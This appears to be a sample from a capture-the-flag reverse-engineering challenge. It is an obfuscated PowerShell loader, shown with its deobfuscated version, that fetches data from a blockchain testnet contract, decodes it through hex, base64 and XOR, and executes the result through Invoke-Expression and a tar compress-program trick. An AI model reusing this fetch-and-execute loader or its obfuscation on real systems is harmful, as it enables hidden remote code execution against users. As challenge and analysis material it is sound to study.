iex ('Set-Variable -Name testnet_endpo'+'int '+'-Value (7zI 7zI)Set-Variable -Name _body -Value (Pa1{7zImethod7zI:7zIeth_call7zI,7zIparams7zI:[{'+'7zIto7zI:7zIf6Kaddress7zI'+',7zIdata7zI:7zI0x5c880fcb7zI}, BLOCK],7zIid7zI:1,7'+'zIjsonrpc7zI:7zI2.07zI}Pa1)Set-Variable -Name resp -Value ((Invoke-RestMeth'+'od -Metho'+'d Pa1PostPa1 -Uri f6Ktestnet_endpoint -C'+'ontentType 7zIapplication/json7zI -Body f6K_body).result)#'+' Remove the Pa10xPa1 prefixSet-Variable -Name hexNumber -Value (f6Kresp -replace Pa10xPa1, Pa1Pa1)# Convert from hex to bytes '+'(ensuring pairs of hex characters)Set-Variable -Name bytes0 -Value (0..(f6KhexNumber.Length / 2 - 1) IOs '+'ForEach-Objec'+'t'+' {Set-Variable -Name startIndex -Value (f6K_ * 2)Set-Variable -Name'+' endIndex -Value (f6KstartI'+'ndex + 1)'+'  [Convert]::ToByte(f6KhexNumber.Substring(f6KstartIndex, 2), 16)}) Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString(f6Kbytes0))Set-Variabl'+'e -Name bytes2 -Value (f6Kbytes1.Substring(64, 188))# Convert from base64 to bytesSet-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64Str'+'ing(f6Kbytes2))Set-Variable '+'-Name resultAscii'+' -Value'+' ([System.T'+'ext.Encod'+'ing]::UTF8.G'+'etString(f6Kbyte'+'sFromBase64))Set-Variable -Name hexBytes -Val'+'ue (f6Kresu'+'ltAscii IOs ForEach-Object {Pa1{0:X2}Pa1 -f f6K_  # Format each byte as two-digit hex with uppe'+'rcase letters})Set-V'+'ariable -Name '+'hexString -Value (f6KhexBytes -join'+' Pa1 Pa1) #Write-Outp'+'ut f6Khe'+'xStringSet-Variable -Name hexBytes -V'+'alue '+'(f6KhexBytes -replace 7zI 7zI, 7zI7zI)# Convert from'+' hex to bytes (ensuring pairs of hex characters)Se'+'t-Variable -Name bytes3 -Value (0..(f6KhexBytes.Length / 2 - 1) IOs ForEach-Object {Set-Variable -Name startIndex -Value (f6K_ * 2)Set-Va'+'riable -Name endIndex -Value (f6KstartIndex + 1)[Convert]::ToByte(f6KhexBytes.Substring(f6KstartIndex, 2), 16)})Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString(f6Kbytes3))# Convert the key to bytesS'+'et-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes(7zIFLAREON247zI))# Perform the XOR operationSet-Variable'+' -Name resultBytes -Value (@())for (Set-Variable -Name i -Value (0); f6Ki -lt f6Kbytes5.Length; f6Ki++) {Set-'+'Variable -Name resultBytes -Value (f6KresultBytes + (f6Kbytes5[f6Ki] -bxor f6KkeyBytes[f6Ki % f6KkeyBytes.Length])) }# Convert the res'+'u'+'lt ba'+'ck to a string (assuming ASCII encoding)Set-Variable -Name resultString -Value ([System.Text.Encoding]::'+'ASCII.'+'GetString(f6KresultBytes))Set-Variable -N'+'ame command '+'-Value (7'+'zItar -x --use-compress-progr'+'am Pa1cmd /c echo f'+'6Kresu'+'ltString > C:WjZWjZfl'+'agPa1 -f C:WjZWjZflag7zI)Invoke-Expression f6Kcommand').REPLAcE(([cHAR]102+[cHAR]54+[cHAR]75),[STRInG][cHAR]36).REPLAcE(([cHAR]80+[cHAR]97+[cHAR]49),[STRInG][cHAR]39).REPLAcE(([cHAR]87+[cHAR]106+[cHAR]90),'\').REPLAcE(([cHAR]55+[cHAR]122+[cHAR]73),[STRInG][cHAR]34).REPLAcE('IOs',[STRInG][cHAR]124)|.((varIABlE '*mdr*').NAmE[3,11,2]-JoIN'')



 Set-Variable -Name testnet_endpoint -Value ("https://data-seed-prebsc-1-s1.binance.org:8545/")
 Set-Variable -Name _body -Value ('{"method":"eth_call","params":[{"to":"$address","data":"0x5c880fcb"}, BLOCK],"id":1,"jsonrpc":"2.0"}')
 Set-Variable -Name resp -Value ((Invoke-RestMethod -Method 'Post' -Uri $testnet_endpoint -ContentType "application/json" -Body $_body).result) 
 # Remove the '0x' prefix
 Set-Variable -Name hexNumber -Value ($resp -replace '0x', '')
 # Convert from hex to bytes (ensuring pairs of hex characters)
 Set-Variable -Name bytes0 -Value (0..($hexNumber.Length / 2 - 1) | 
 	ForEach-Object {
 		Set-Variable -Name startIndex -Value ($_ * 2)
 		Set-Variable -Name endIndex -Value ($startIndex + 1)  [Convert]::ToByte($hexNumber.Substring($startIndex, 2), 16)}) 
 		Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString($bytes0))
 		Set-Variable -Name bytes2 -Value ($bytes1.Substring(64, 188))
 		# Convert from base64 to bytesSet-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64String($bytes2))
 		Set-Variable -Name resultAscii -Value ([System.Text.Encoding]::UTF8.GetString($bytesFromBase64))
 		Set-Variable -Name hexBytes -Value ($resultAscii | 
 			ForEach-Object {
 				'{0:X2}' -f $_  # Format each byte as two-digit hex with uppercase letters
 			})
 			Set-Variable -Name hexString -Value ($hexBytes -join ' ') 
 			#Write-Output $hexStringSet-Variable -Name hexBytes -Value ($hexBytes -replace " ", "")
 			# Convert from hex to bytes (ensuring pairs of hex characters)
 			Set-Variable -Name bytes3 -Value (0..($hexBytes.Length / 2 - 1) | 
 				ForEach-Object {
 					Set-Variable -Name startIndex -Value ($_ * 2)
 					Set-Variable -Name endIndex -Value ($startIndex + 1)[Convert]::ToByte($hexBytes.Substring($startIndex, 2), 16)})
 					Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString($bytes3))
 					# Convert the key to bytes
 					Set-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes("FLAREON24"))
 					# Perform the XOR operation
 					Set-Variable -Name resultBytes -Value (@())
 					for ( Set-Variable -Name i -Value (0); $i -lt $bytes5.Length; $i++) {
 						Set-Variable -Name resultBytes -Value ($resultBytes + ($bytes5[$i] -bxor $keyBytes[$i % $keyBytes.Length])) }
 						# Convert the result back to a string (assuming ASCII encoding)
 						Set-Variable -Name resultString -Value ([System.Text.Encoding]::ASCII.GetString($resultBytes))
 						Set-Variable -Name command -Value ("tar -x --use-compress-program 'cmd /c echo $resultString > C:\\flag' -f C:\\flag")
 						Invoke-Expression $command